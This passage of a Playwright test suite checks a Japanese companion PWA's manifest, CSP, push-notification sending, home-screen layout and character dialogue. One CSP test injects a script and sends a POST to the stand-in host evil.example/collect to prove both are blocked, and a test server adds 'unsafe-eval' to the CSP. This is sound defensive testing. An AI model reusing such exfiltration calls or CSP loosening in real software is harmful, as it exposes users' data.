"""PWAの検証（ヘッドレスChrome）。localhost で app/ を配信し、PWAとして最低限成立しているかを見る。
iOS固有の挙動（ホーム画面追加・通知許可）はここでは確認できないため、実機手順は docs/roadmap.md を参照。
"""
import functools
from datetime import datetime
import json
import re
import struct
import threading
import zlib
import unittest
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

from playwright.sync_api import sync_playwright

APP_DIR = Path(__file__).resolve().parent.parent / "app"
# 画面のテストは、文面を固定したセリフ集（2026-11-20 までの文）で動きを確かめる。文面を直してもテストを書き直さずに済むように。
# 本物のセリフ集（app/data/dialogue.json）は test_dialogue.py と、/real/ の下を開くテスト（話し方・アハウ）で確かめる
FIXTURE_DIALOGUE = Path(__file__).resolve().parent / "fixtures" / "dialogue_fixture.json"
MOOD_NORMAL = "localStorage.setItem('db.reports', JSON.stringify({ '2026-11-09': { mood: 'normal', done: '', left: '', tomorrow: '', savedAt: 1 } }));"  # 今日の調子を聞いたあと（D-073）
ADD_NONE = "#task-list .task-group[data-priority=none] .add-plus, #task-list .task-slot[data-priority=none] .add-slot"  # 優先度なしの「追加」（タスクがあれば見出しの ＋、なければ点線の欄。D-070）

# iPhone の 3 機種（V4-02）：(幅, 高さ), (上, 下のセーフエリア)
DEVICES = [((375, 667), (20, 0)), ((393, 852), (59, 34)), ((430, 932), (59, 34))]
# 裏に回す操作を模す（window.__vis を 'hidden' にして visibilitychange を発火する）
VISIBILITY = """
Object.defineProperty(Document.prototype, 'visibilityState', { configurable: true, get() { return window.__vis || 'visible'; } });
Object.defineProperty(Document.prototype, 'hidden', { configurable: true, get() { return (window.__vis || 'visible') === 'hidden'; } });
"""
# 設定済み（ready）の状態を作る
READY = "localStorage.setItem('setup.done','1')"
# 読み込んでよいものの決まり（CSP。D-076 ③）に反したら、その画面の JS エラーとして数える（どのテストでも見張る）。
# テストで見た目を足すときは、style タグではなく CSSOM（setProperty・insertRule）を使う（CSP で止められるため）
CSP_GUARD = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', (e) => {
  window.__csp.push(e.violatedDirective + ' ' + e.blockedURI);
  throw new Error('CSP違反: ' + e.violatedDirective + ' ' + e.blockedURI);
});
"""
# ヘッドレスChromeは本物のプッシュ購読ができない（外部通信が必要）ため、購読処理だけ偽物にする
FAKE_PUSH = """
PushManager.prototype.getSubscription = async () => null;
PushManager.prototype.subscribe = async () => ({
  options: {},
  toJSON: () => ({ endpoint: 'https://web.push.apple.com/fake', keys: { p256dh: 'BBBB', auth: 'AAAA' } }),
});
"""


def make_png(w, h, rgba):
    """単色の PNG を作る（立ち絵の写真のテスト用）。rgba は (r, g, b, a)"""
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    raw = b"".join(b"\x00" + bytes(rgba) * w for _ in range(h))
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


class QuietHandler(SimpleHTTPRequestHandler):
    extensions_map = {**SimpleHTTPRequestHandler.extensions_map, ".webmanifest": "application/manifest+json"}

    # Playwright の wait_for_function は、待つあいだ画面の中で文字列を JS として評価する（eval）。CSP（D-076 ③）はそれを止めるので、
    # ふつうのテストでは eval だけを許して配り、CSP のほかの決まり（通信先・差し込みのスクリプト・style タグ）はそのまま効かせる。
    # /strict/ の下は、公開するものと同じ CSP のまま配る（CSP そのもののテスト用）
    def do_GET(self):
        if self.path.startswith("/strict/"):
            self.path = self.path[len("/strict"):]
            return super().do_GET()
        real = self.path.startswith("/real/")  # 本物のセリフ集で開く
        if real:
            self.path = self.path[len("/real"):]
        name = self.path.split("?")[0].split("#")[0]
        if name == "/data/dialogue.json" and not real:
            body = FIXTURE_DIALOGUE.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return None
        if name in ("/index.html", "/send.html"):
            body = (APP_DIR / name[1:]).read_bytes().replace(b"script-src 'self';", b"script-src 'self' 'unsafe-eval';", 1)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return None
        return super().do_GET()

    def log_message(self, *a):
        pass


class PwaTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        handler = functools.partial(QuietHandler, directory=str(APP_DIR))
        cls.server = HTTPServer(("127.0.0.1", 0), handler)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.server.server_port}/"
        cls.pw = sync_playwright().start()
        cls.browser = cls.pw.chromium.launch(
            executable_path="/usr/bin/google-chrome",
        )
        new_context = cls.browser.new_context

        def guarded_context(*a, **k):
            ctx = new_context(*a, **k)
            ctx.add_init_script(CSP_GUARD)
            return ctx

        cls.browser.new_context = guarded_context

    @classmethod
    def tearDownClass(cls):
        cls.browser.close()
        cls.pw.stop()
        cls.server.shutdown()

    def new_page(self, permissions=None, init_script=None):
        ctx = self.browser.new_context(permissions=permissions or [])
        if init_script:
            ctx.add_init_script(init_script)
        self.addCleanup(ctx.close)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        return page

    def test_manifest_is_installable_shape(self):
        m = json.loads((APP_DIR / "manifest.webmanifest").read_text(encoding="utf-8"))
        self.assertEqual(m["display"], "standalone")
        sizes = {i["sizes"] for i in m["icons"]}
        self.assertTrue({"192x192", "512x512"} <= sizes)
        for icon in m["icons"]:
            self.assertTrue((APP_DIR / icon["src"]).exists(), icon["src"])
        self.assertTrue((APP_DIR / "icons/icon-180.png").exists())  # apple-touch-icon

    def test_page_loads_and_service_worker_registers(self):
        page = self.new_page()
        page.goto(self.base + "index.html")
        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
        self.assertEqual(page.text_content("#sw-status"), "登録済み")
        self.assertEqual(page.text_content("#source"), "URLを直接開いた")
        # 画面の版と sw.js のキャッシュ版が一致している（更新し忘れ防止）
        sw = (APP_DIR / "sw.js").read_text(encoding="utf-8")
        self.assertIn(f"const CACHE_VERSION = '{page.text_content('#app-version')}'", sw)

    def test_csp_is_strict_and_every_screen_loads_without_violations(self):
        """CSP（D-076 ③）：スクリプトはこのサイトのファイルだけ。どの画面を開いても違反が出ない（違反は CSP_GUARD が JS エラーにする）"""
        index = (APP_DIR / "index.html").read_text(encoding="utf-8")
        send = (APP_DIR / "send.html").read_text(encoding="utf-8")
        for html in (index, send):
            csp = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', html).group(1)
            self.assertIn("script-src 'self';", csp)
            self.assertIn("object-src 'none'", csp)
            self.assertIn("base-uri 'none'", csp)
            self.assertNotIn("unsafe-eval", csp)
            self.assertNotIn("connect-src *", csp)
        index_csp = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', index).group(1)
        self.assertNotIn("unsafe-inline", index_csp)
        self.assertNotIn("<script>", index)
        self.assertNotIn(' style="', index)
        page = self.new_page(permissions=["notifications"], init_script=READY)
        page.goto(self.base + "strict/index.html?mode=standalone")  # 公開するものと同じ CSP
        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
        for view in ["tasks", "report", "timer", "schedule", "settings", "system", "home"]:
            page.evaluate("(v) => { location.hash = '#' + v; }", view)
            page.wait_for_selector(f"#view-{view}", state="visible", timeout=3_000)
        self.assertEqual(page.evaluate("window.__csp"), [])
        page2 = self.new_page()
        page2.goto(self.base + "strict/send.html")
        page2.wait_for_selector("#send-status", state="attached")
        self.assertNotEqual(page2.input_value("#click"), "")
        self.assertEqual(page2.evaluate("window.__csp"), [])

    def test_csp_blocks_injected_script_and_unknown_hosts(self):
        """CSP が効いている：差し込まれたスクリプトは動かず、決めていない送り先には通信しない"""
        ctx = self.browser.new_context()
        self.addCleanup(ctx.close)
        page = ctx.new_page()
        page.goto(self.base + "strict/index.html")
        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
        ran = page.evaluate("""() => new Promise((resolve) => {
          const s = document.createElement('script');
          s.textContent = 'window.__injected = 1';
          document.body.append(s);
          setTimeout(() => resolve(window.__injected === 1), 50);
        })""")
        self.assertFalse(ran)
        blocked = page.evaluate("() => fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).then(() => false, () => true)")
        self.assertTrue(blocked)
        violations = page.evaluate("window.__csp")
        self.assertTrue(any(v.startswith("script-src") for v in violations), violations)
        self.assertTrue(any(v.startswith("connect-src") for v in violations), violations)

    def test_opened_from_notification_is_detected(self):
        page = self.new_page()
        page.goto(self.base + "index.html?source=ntfy")
        self.assertEqual(page.text_content("#source"), "通知（ntfy）のタップ")

    def test_send_page_posts_scheduled_notification_to_ntfy(self):
        page = self.new_page()
        sent = []

        def fake_ntfy(route):
            sent.append(route.request)
            route.fulfill(status=200, content_type="application/json",
                          headers={"Access-Control-Allow-Origin": "*"},
                          body='{"id":"fake","time":1800000000}')

        page.route("https://ntfy.sh/", fake_ntfy)
        page.goto(self.base + "send.html")
        self.assertTrue(page.input_value("#click").endswith("/index.html?source=ntfy"))
        page.click("#send")  # トピック未入力
        self.assertIn("トピック名を入力", page.text_content("#send-status"))
        page.fill("#topic", "test-topic")
        page.select_option("#delay", "5")
        page.click("#send")
        page.wait_for_selector("#send-status.ok", timeout=5_000)
        self.assertEqual(len(sent), 1)
        body = json.loads(sent[0].post_data)
        self.assertEqual(body["topic"], "test-topic")
        self.assertTrue(body["delay"].isdigit())
        self.assertIn("予定", body["message"])
        # application/json を付けるとCORSの事前確認が必要になるため、付けていないことを確認
        self.assertNotIn("json", sent[0].headers.get("content-type", ""))

    def test_generated_topic_is_random_and_remembered(self):
        page = self.new_page()
        page.goto(self.base + "send.html")
        page.click("#gen-topic")
        t1 = page.input_value("#topic")
        self.assertRegex(t1, r"^kiinichi-[0-9a-f]{24}$")
        page.reload()
        self.assertEqual(page.input_value("#topic"), t1)

    def test_send_page_web_push_calls_worker_with_token(self):
        page = self.new_page()
        calls = []

        def fake_worker(route):
            calls.append(route.request)
            if route.request.method == "OPTIONS":
                route.fulfill(status=204, headers={"Access-Control-Allow-Origin": "*",
                                                   "Access-Control-Allow-Headers": "Authorization, Content-Type",
                                                   "Access-Control-Allow-Methods": "GET, POST, OPTIONS"})
                return
            route.fulfill(status=200, content_type="application/json",
                          headers={"Access-Control-Allow-Origin": "*"},
                          body='{"ok":true,"scheduled":true,"at":1800000000000}')

        page.route("https://kiinichi.example.workers.dev/**", fake_worker)
        page.goto(self.base + "send.html")
        # 送信サーバーのURLは最初から入っている（D-014）。合言葉は空
        self.assertEqual(page.input_value("#wp-worker-url"), "https://kiinichi-push.numwm.workers.dev")
        self.assertEqual(page.input_value("#wp-token"), "")
        page.click("#wp-send")
        self.assertIn("合言葉", page.text_content("#wp-status"))  # 合言葉が未入力なら入力を促す
        page.fill("#wp-worker-url", "https://kiinichi.example.workers.dev/")
        page.dispatch_event("#wp-worker-url", "change")
        page.fill("#wp-token", "tok-123")
        page.dispatch_event("#wp-token", "change")
        page.select_option("#delay", "5")
        page.click("#wp-send")
        page.wait_for_selector("#wp-status.ok", timeout=5_000)
        self.assertIn("予約しました", page.text_content("#wp-status"))
        post = [c for c in calls if c.method == "POST"][0]
        self.assertEqual(post.url, "https://kiinichi.example.workers.dev/api/send")
        self.assertEqual(post.headers["authorization"], "Bearer tok-123")
        body = json.loads(post.post_data)
        self.assertEqual(body["delaySeconds"], 300)
        self.assertTrue(body["url"].endswith("/index.html?source=webpush"))
        # 声掛けの種類を選ぶと、タップ先URLに trigger が付く
        page.select_option("#wp-trigger", "midday_check.meal_overdue")
        page.select_option("#delay", "0")
        page.click("#wp-send")
        # 偽サーバーは常に「予約済み」と返すので、表示ではなく2回目の送信が届いたことで待つ
        deadline = 50
        while len([c for c in calls if c.method == "POST"]) < 2 and deadline:
            page.wait_for_timeout(100)
            deadline -= 1
        post2 = [c for c in calls if c.method == "POST"][-1]
        body2 = json.loads(post2.post_data)
        # 本文はセリフそのもの、URL にその番号（line）が付く（T07, C5-05）
        self.assertTrue(body2["url"].endswith("?source=webpush&trigger=midday_check.meal_overdue&line=0"), body2["url"])
        self.assertEqual(body2["body"], "そろそろ飯の時間、過ぎてるぞ。食べたら開いて押しておけ。")
        self.assertEqual(body2["title"], "キィニチ（テスト）")
        self.assertNotIn("delaySeconds", body2)
        page.reload()  # 設定は端末に保存される
        self.assertEqual(page.input_value("#wp-worker-url"), "https://kiinichi.example.workers.dev/")

    def test_safari_shows_only_add_to_home_screen_guide(self):
        page = self.new_page()
        page.goto(self.base + "index.html")
        self.assertEqual(page.get_attribute("body", "data-state"), "safari")
        self.assertTrue(page.is_visible("#onboard-safari"))
        self.assertFalse(page.is_visible("#main"))
        self.assertFalse(page.is_visible("#onboard-setup"))

    def test_first_launch_setup_registers_and_moves_to_ready(self):
        page = self.new_page(permissions=["notifications"], init_script=FAKE_PUSH)
        calls = []

        def fake_worker(route):
            req = route.request
            calls.append(req)
            cors = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Authorization, Content-Type",
                    "Access-Control-Allow-Methods": "GET, POST, OPTIONS"}
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=cors)
            elif req.url.endswith("/api/vapid-public-key"):
                route.fulfill(status=200, content_type="application/json", headers=cors,
                              body='{"publicKey":"BHwerwZnkkro38y8e_YA6eiURgYes1c4BxSzHrU8kWsGJcOF7AvYnH2mievzMzSHhWWTG2DdGjnPDcDXpwrbsYM"}')
            else:
                route.fulfill(status=200, content_type="application/json", headers=cors, body='{"ok":true}')

        page.route("https://kiinichi-push.numwm.workers.dev/**", fake_worker)
        page.goto(self.base + "index.html?mode=standalone")
        self.assertEqual(page.get_attribute("body", "data-state"), "setup")
        self.assertFalse(page.is_visible("#main"))
        page.wait_for_selector("#sw-status.ok", state="attached", timeout=10_000)
        # 合言葉なし → 入力を促し、状態は setup のまま
        page.click("#setup-start")
        page.wait_for_function("document.getElementById('setup-status').textContent.includes('合言葉')", timeout=5_000)
        self.assertEqual(page.get_attribute("body", "data-state"), "setup")
        # 合言葉あり → 登録して ready へ
        page.fill("#setup-token", "tok-xyz")
        page.dispatch_event("#setup-token", "change")
        page.click("#setup-start")
        page.wait_for_function("document.body.dataset.state === 'ready'", timeout=10_000)
        self.assertTrue(page.is_visible("#main"))
        sub = [c for c in calls if c.method == "POST" and c.url.endswith("/api/subscribe")][0]
        self.assertEqual(sub.headers["authorization"], "Bearer tok-xyz")
        self.assertEqual(json.loads(sub.post_data)["endpoint"], "https://web.push.apple.com/fake")
        page.reload()  # 次に開いたときは ready のまま
        self.assertEqual(page.get_attribute("body", "data-state"), "ready")

    def test_phase0_users_with_saved_token_skip_setup(self):
        page = self.new_page(permissions=["notifications"],
                             init_script="localStorage.setItem('phase0.appToken','old-token')")
        page.goto(self.base + "index.html?mode=standalone")
        self.assertEqual(page.get_attribute("body", "data-state"), "ready")

    def test_mode_param_is_ignored_outside_localhost(self):
        app_js = (APP_DIR / "app.js").read_text(encoding="utf-8")
        self.assertIn("['localhost', '127.0.0.1'].includes(location.hostname)", app_js)

    def test_webpush_source_is_detected(self):
        page = self.new_page()
        page.goto(self.base + "index.html?source=webpush")
        self.assertEqual(page.text_content("#source"), "通知（Web Push）のタップ")

    # ---------- ホーム（D-018） ----------
    def ready_page(self, query=""):
        page = self.new_page(permissions=["notifications"], init_script=READY)
        page.goto(self.base + "index.html?mode=standalone" + query)
        return page

    def clock_page(self, hour, minute, query="", size=(393, 852), safe=None, day=9, init_script=None, routes=None):
        """時刻と画面の大きさを決めて、設定済みの状態でホームを開く。safe=(上, 下) でセーフエリアを模す。
        routes={URL の形: 処理} で、開く前から通信を差し替える"""
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": size[0], "height": size[1]})
        self.addCleanup(ctx.close)
        for pattern, handler in (routes or {}).items():
            ctx.route(pattern, handler)
        ctx.add_init_script(READY)
        ctx.add_init_script(VISIBILITY)
        if init_script:
            ctx.add_init_script(init_script)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        page.clock.install(time=datetime(2026, 11, day, hour, minute, 0))
        page.goto(self.base + "index.html?mode=standalone" + query)
        if safe:
            page.evaluate("([t, b]) => { const r = document.documentElement.style; r.setProperty('--safe-top', t + 'px'); r.setProperty('--safe-bottom', b + 'px'); }", list(safe))
        page.wait_for_function("dialogue !== null", timeout=3_000)
        return page

    def test_home_shows_clock_next_event_and_portrait_within_3_seconds(self):
        import time
        page = self.new_page(permissions=["notifications"], init_script=READY)
        t0 = time.monotonic()
        page.goto(self.base + "index.html?mode=standalone")
        page.wait_for_function(
            "/^\\d{2}:\\d{2}$/.test(document.getElementById('clock-time').textContent)"
            " && document.getElementById('next-event').textContent.trim() !== '-'", timeout=3_000)
        self.assertLess(time.monotonic() - t0, 3.0)
        self.assertTrue(page.is_visible("#portrait"))
        self.assertTrue(page.is_visible("#view-home"))
        self.assertFalse(page.is_visible("#view-settings"))

    def test_next_event_picks_first_future_item(self):
        page = self.clock_page(10, 0)  # 月曜（平日の毎日の時刻。D-048）
        titles = page.evaluate("""() => {
          const at = (h, m) => { const d = new Date(); d.setHours(h, m, 0, 0); return d; };
          const pick = (now) => (SampleData.todayEvents(now).find((e) => e.at > now) || {}).title || null;
          return [pick(at(8, 0)), pick(at(12, 0)), pick(at(23, 45))];
        }""")
        self.assertEqual(titles, ["仕事開始", "仕事終わり", None])

    def test_opened_from_notification_shows_that_triggers_line(self):
        page = self.ready_page("&source=webpush&trigger=midday_check.meal_overdue")
        page.wait_for_function("document.getElementById('bubble-text').textContent.includes('飯の時間')", timeout=3_000)
        # 声の再生は見送り（D-023）。通知のセリフはセリフの面の上辺を金にして示す（D-024）
        self.assertTrue(page.evaluate("document.body.classList.contains('from-notification')"))
        top = page.eval_on_selector(".dialogue", "e => getComputedStyle(e).getPropertyValue('--dlg-top')")
        self.assertIn("e8c45c", top.lower())

    def test_record_button_shows_template_line(self):
        page = self.clock_page(9, 3)
        page.click(".act[data-record=work_start]")
        line = page.text_content("#bubble-text")
        self.assertIn(line, ["わかった。何かあったら声をかけてくれ。", "了解。進捗、気になったらこっちから聞く。"])

    def test_tabbar_switches_views(self):
        # D-019 Q1：タブは5個、設定はホーム右上のアイコンから開き「‹ ホーム」で戻る
        page = self.ready_page()
        self.assertEqual(len(page.query_selector_all(".tabbar a")), 5)
        # タブはアイコンだけ。名前は読み上げ用に持つ（D-078）
        tabs = page.eval_on_selector_all(".tabbar a", """els => els.map((e) => {
          const r = e.getBoundingClientRect(), s = e.querySelector('svg').getBoundingClientRect();
          return [e.getAttribute('aria-label'), e.textContent.trim(), r.width >= 44 && r.height >= 44, Math.round(s.width)];
        })""")
        self.assertEqual(tabs, [[n, "", True, 28] for n in ["ホーム", "予定", "タスク", "タイマー", "日報"]])
        self.assertEqual(page.get_by_role("link", name="予定").get_attribute("data-view"), "schedule")
        self.assertEqual(page.get_attribute(".tabbar a[data-view=home]", "aria-current"), "page")
        page.click(".home-header a[data-view=settings]")
        page.wait_for_selector("#view-settings", state="visible", timeout=3_000)
        self.assertFalse(page.is_visible("#view-home"))
        self.assertIsNone(page.get_attribute(".tabbar a[data-view=home]", "aria-current"))
        self.assertEqual(page.text_content("#app-version"), page.evaluate("APP_VERSION"))
        page.click("#view-settings .back")
        page.wait_for_selector("#view-home", state="visible", timeout=3_000)
        page.click(".tabbar a[data-view=tasks]")
        page.wait_for_selector("#view-tasks", state="visible", timeout=3_000)
        self.assertEqual(page.get_attribute(".tabbar a[data-view=tasks]", "aria-current"), "page")

    def test_inputs_are_16px_or_larger(self):
        # 16px 未満の入力欄は iOS がフォーカス時に画面を拡大する（V2-04）
        page = self.new_page(permissions=["notifications"], init_script=READY)
        page.goto(self.base + "index.html?mode=standalone#settings")
        sizes = page.eval_on_selector_all("input", "els => els.map(e => parseFloat(getComputedStyle(e).fontSize))")
        self.assertTrue(sizes)
        self.assertTrue(all(sz >= 16 for sz in sizes), sizes)

    # ---------- ホームの構造（T03, D-019 Q2=A, Q3=28px） ----------
    def test_home_fits_without_scrolling(self):
        for size, safe in DEVICES:
            with self.subTest(size=size):
                page = self.clock_page(9, 3, size=size, safe=safe)
                m = page.evaluate("""() => {
                  const d = document.querySelector('.dialogue').getBoundingClientRect();
                  const acts = [...document.querySelectorAll('.act')].map((b) => {
                    const lh = parseFloat(getComputedStyle(b).lineHeight) || parseFloat(getComputedStyle(b).fontSize) * 1.3;
                    return { h: b.getBoundingClientRect().height, sw: b.scrollWidth, cw: b.clientWidth, top: b.getBoundingClientRect().top };
                  });
                  return { sh: document.documentElement.scrollHeight, ih: innerHeight,
                           dBottom: d.bottom, acts };
                }""")
                self.assertLessEqual(m["sh"], m["ih"], f"{size} ではみ出している")
                self.assertLess(m["dBottom"], min(a["top"] for a in m["acts"]), "セリフの面は記録ボタンより上")
                for a in m["acts"]:
                    self.assertLessEqual(a["sw"], a["cw"], "記録ボタンのラベルが収まっていない")
                    self.assertGreater(a["top"], m["ih"] / 2)

    def test_clock_size_matches_decision(self):
        page = self.clock_page(9, 3)
        size = page.eval_on_selector("#clock-time", "e => parseFloat(getComputedStyle(e).fontSize)")
        self.assertEqual(size, 48)  # D-021 で D-019 Q3（28px）を改訂

    def test_home_dom_order(self):
        page = self.clock_page(9, 3)
        order = page.evaluate("[...document.querySelectorAll('#view-home > *')].map(e => e.className.split(' ')[0])")
        self.assertEqual(order[:5], ["home-header", "stage", "dialogue", "next-strip", "record-dock"])

    def test_next_event_shows_tomorrow_after_last_item(self):
        page = self.clock_page(23, 48)
        self.assertEqual(page.text_content(".next-day"), "明日")
        self.assertEqual(page.text_content(".next-time"), "07:00")
        self.assertEqual(page.text_content(".next-title"), "起床")
        self.assertEqual(page.text_content("#next-rest"), "あと7時間12分")

    def test_next_event_rest_under_an_hour(self):
        page = self.clock_page(17, 50)
        self.assertEqual(page.text_content(".next-title"), "仕事終わり")
        self.assertEqual(page.text_content("#next-rest"), "あと40分")
        self.assertEqual(page.query_selector(".next-day"), None)

    # ---------- セリフの選び方（T05, D-019 Q4=出す） ----------
    def idle_lines(self, period):
        data = json.loads(FIXTURE_DIALOGUE.read_text(encoding="utf-8"))
        cond = [c for c in data["idle_greeting"]["conditions"] if c["id"] == period][0]
        return cond["lines"]

    def test_idle_line_follows_time_of_day(self):
        for hour, period in [(7, "morning"), (13, "day"), (19, "evening"), (23, "night")]:
            with self.subTest(hour=hour):
                page = self.clock_page(hour, 0)
                page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
                self.assertIn(page.text_content("#bubble-text"), self.idle_lines(period))
                self.assertEqual(page.get_attribute("body", "data-period"), period)

    def test_line_is_not_repeated(self):
        page = self.clock_page(13, 0)
        texts = page.evaluate("[0,1,2,3,4,5].map(() => pickLine('idle_greeting.day').text)")
        for a, b in zip(texts, texts[1:]):
            self.assertNotEqual(a, b, texts)

    def test_notification_line_param_is_used(self):
        page = self.clock_page(9, 3, "&source=webpush&trigger=work_start.default&line=1")
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertEqual(page.text_content("#bubble-text"), "了解。進捗、気になったらこっちから聞く。")
        page = self.clock_page(9, 3, "&source=webpush&trigger=work_start.default&line=9")
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertIn(page.text_content("#bubble-text"),
                      ["わかった。何かあったら声をかけてくれ。", "了解。進捗、気になったらこっちから聞く。"])

    def test_tone_picks_own_lines_or_falls_back_to_client(self):
        """話し方（D-082）：友人版・甘やかし版の文があればそれ、なければ依頼人版の文。既定は依頼人版"""
        page = self.clock_page(9, 3)
        self.assertEqual(page.evaluate("currentTone()"), "client")
        page.evaluate("""() => { dialogue = { t: { conditions: [
          { id: 'a', lines: ['依頼人'], lines_friend: ['友人'], lines_sweet: ['甘やかし'] },
          { id: 'b', lines: ['依頼人だけ'] } ] } }; }""")
        picks = lambda: page.evaluate("[pickLine('t.a').text, pickLine('t.b').text]")
        self.assertEqual(picks(), ["依頼人", "依頼人だけ"])
        page.evaluate("Prefs.set('tone', 'friend')")
        self.assertEqual(picks(), ["友人", "依頼人だけ"])
        page.evaluate("Prefs.set('tone', 'sweet')")
        self.assertEqual(picks(), ["甘やかし", "依頼人だけ"])
        page.evaluate("Prefs.set('tone', 'boss')")  # 知らない値は依頼人版
        self.assertEqual(picks(), ["依頼人", "依頼人だけ"])

    def test_tone_setting_switches_and_remembers(self):
        """設定の「キィニチの話し方」（D-082）：3つから1つ。押すと覚え、説明が変わり、tonechange を出す。はじめは依頼人"""
        for size, safe in (((393, 852), (59, 34)), ((375, 667), (20, 0))):
            page = self.clock_page(10, 0, "#settings", size=size, safe=safe)
            pressed = lambda: page.eval_on_selector_all("#view-settings [data-tone]", "els => els.map(e => [e.dataset.tone, e.getAttribute('aria-pressed')])")
            self.assertEqual(pressed(), [["client", "true"], ["friend", "false"], ["sweet", "false"]])
            self.assertIn("依頼人", page.text_content("#tone-note"))
            sizes = page.eval_on_selector_all("#view-settings [data-tone]", "els => els.map(e => [Math.round(e.getBoundingClientRect().height), e.scrollWidth <= e.clientWidth])")
            self.assertTrue(all(h >= 44 and fits for h, fits in sizes), sizes)
            self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), size[0])
        page.evaluate("window.__tone = 0; addEventListener('tonechange', () => { window.__tone++; })")
        page.click("#view-settings [data-tone=sweet]")
        self.assertEqual(pressed(), [["client", "false"], ["friend", "false"], ["sweet", "true"]])
        self.assertIn("気を許した相手", page.text_content("#tone-note"))
        self.assertEqual(page.evaluate("[currentTone(), window.__tone]"), ["sweet", 1])
        page.click("#view-settings [data-tone=sweet]")  # 同じものをもう一度押しても変わらない
        self.assertEqual(page.evaluate("window.__tone"), 1)
        page.reload()
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.get_attribute("#view-settings [data-tone=sweet]", "aria-pressed"), "true")

    # ---------- 触ったときの反応・開いたときの場面（D-083）。文面はまだないので、テスト用のセリフを足して確かめる ----------
    SCENE_LINES = {
        "touch": ["rapid:連続", "warn:注意", "after_warn:注意後", "stop:打ち切り", "return:再訪", "morning:朝のタッチ", "day:昼のタッチ", "night:夜のタッチ", "head:頭"],
        "hold": ["head:頭の長押し"],
        "first_launch": ["default:初回"],
        "home": ["tasks_some:{done}つ片づいた。残り{left}", "tasks_all:全部片づいた", "tired_today:疲れた日", "after_tired:疲れた翌日", "after_late:遅寝の翌日"],
        "rare": ["open:レア", "day7:7日目", "day30:30日目", "day100:100日目"],
    }

    def scene_page(self, hour, minute=0, init="", day=9, size=(393, 852)):
        data = json.loads(FIXTURE_DIALOGUE.read_text(encoding="utf-8"))
        for trigger, items in self.SCENE_LINES.items():
            data[trigger] = {"conditions": [{"id": x.split(":", 1)[0], "lines": [x.split(":", 1)[1]]} for x in items]}
        body = json.dumps(data, ensure_ascii=False)
        route = lambda r: r.fulfill(status=200, content_type="application/json", body=body)
        return self.clock_page(hour, minute, init_script=init, day=day, size=size, routes={"**/data/dialogue.json": route})

    def bubble(self, page):
        return page.text_content("#bubble-text")

    def test_touch_stages_escalate_mute_and_return(self):
        """触る段階（D-083 ①）：3秒以内に3回で連続、2回ごとに注意 → 注意後も → 打ち切り。打ち切りのあとは黙り、時間をおいて触ると再訪"""
        page = self.scene_page(10, 0)
        t = lambda ms: page.evaluate("(ms) => Touch.touch(null, false, ms)", ms)
        base = page.evaluate("Date.now()")  # 偽の時計の今（時間帯はこの時刻で決まる）
        self.assertEqual([t(base), t(base + 500)], ["touch.day", "touch.day"])  # 場所なしは時間帯のセリフ
        self.assertEqual(t(base + 1000), "touch.rapid")
        self.assertEqual(self.bubble(page), "連続")
        got = [t(base + 1000 + 400 * i) for i in range(1, 7)]
        self.assertEqual(got, ["touch.rapid", "touch.warn", "touch.warn", "touch.after_warn", "touch.after_warn", "touch.stop"])
        stop = base + 1000 + 400 * 6
        self.assertIsNone(t(stop + 60_000))  # 打ち切りのあいだは黙る
        self.assertEqual(self.bubble(page), "打ち切り")
        self.assertEqual(t(stop + 4 * 60_000), "touch.return")  # 3分たって触った
        self.assertEqual(t(stop + 10 * 60_000), "touch.day")  # そのあとは通常
        # しばらく触らなければ段階は戻る
        self.assertEqual([t(base + 3_600_000 + i * 300) for i in range(3)][-1], "touch.rapid")
        self.assertEqual(t(base + 3_600_000 + 20_000), "touch.day")

    def test_touch_place_alternates_with_time_and_hold(self):
        """場所の印に入れば場所のセリフと時間帯のセリフを交互に。長押しは場所の長押しのセリフ。印の外は時間帯だけ"""
        init = "localStorage.setItem('db.portrait', JSON.stringify({ w: 300, h: 400, alpha: false, scale: 1, x: 0, y: 0, spots: { head: { x: 0.5, y: 0.1, r: 0.1 } } }));"
        page = self.scene_page(21, 0, init=init)
        rect = "{ width: 300, height: 400 }"
        self.assertEqual(page.evaluate("Touch.partAt(0.52, 0.11, %s)" % rect), "head")
        self.assertIsNone(page.evaluate("Touch.partAt(0.5, 0.5, %s)" % rect))
        t = lambda part, hold, ms: page.evaluate("([p, h, ms]) => Touch.touch(p, h, ms)", [part, hold, ms])
        base = page.evaluate("Date.now()")  # 偽の時計の今（時間帯はこの時刻で決まる）
